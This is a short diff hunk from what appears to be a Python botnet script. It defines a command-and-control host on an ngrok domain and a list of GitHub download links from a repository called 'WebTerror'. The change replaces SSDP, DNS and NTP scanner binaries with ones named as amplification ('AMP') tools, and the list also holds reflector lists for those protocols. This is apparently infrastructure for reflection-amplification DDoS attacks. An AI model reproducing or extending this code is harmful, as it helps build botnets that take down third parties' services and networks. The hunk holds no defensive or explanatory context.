@@ -10,9 +10,9 @@ import os
 _lock = Lock()
 CNC = '4334291e.ngrok.io'
 LINKS = [
-    'https://github.com/SaxAlien/WebTerror/raw/master/scan/SSDPSCAN',
-    'https://github.com/SaxAlien/WebTerror/raw/master/scan/DNSSCAN',
-    'https://github.com/SaxAlien/WebTerror/raw/master/scan/NTPSCAN',
+    'https://github.com/SaxAlien/WebTerror/raw/master/scan/SSDPAMP',
+    'https://github.com/SaxAlien/WebTerror/raw/master/scan/DNSAMP',
+    'https://github.com/SaxAlien/WebTerror/raw/master/scan/NTPAMP',
     # ===============================================================
     'https://github.com/SaxAlien/WebTerror/raw/master/list/SSDP.txt',
     'https://github.com/SaxAlien/WebTerror/raw/master/list/DNS.txt',
